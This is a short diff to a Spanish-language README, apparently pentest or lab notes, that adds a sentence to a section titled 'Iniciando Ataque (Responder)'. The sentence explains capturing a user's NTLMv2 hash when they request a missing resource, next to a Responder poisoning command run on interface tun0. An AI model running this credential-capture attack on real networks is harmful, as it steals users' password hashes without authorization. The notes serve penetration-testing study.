@@ -9,6 +9,7 @@
 [Ver la imagen](Images/main/README.md)
 
 # Iniciando Ataque (Responder)
+En el momento en el que un usario acceda a un recurso que no existe, solicitaremos que se conecte a nosotros y obtendremos su Hash NTMLv2.
 
 ```
 python /usr/share/responder.py -I tun0 -rdw
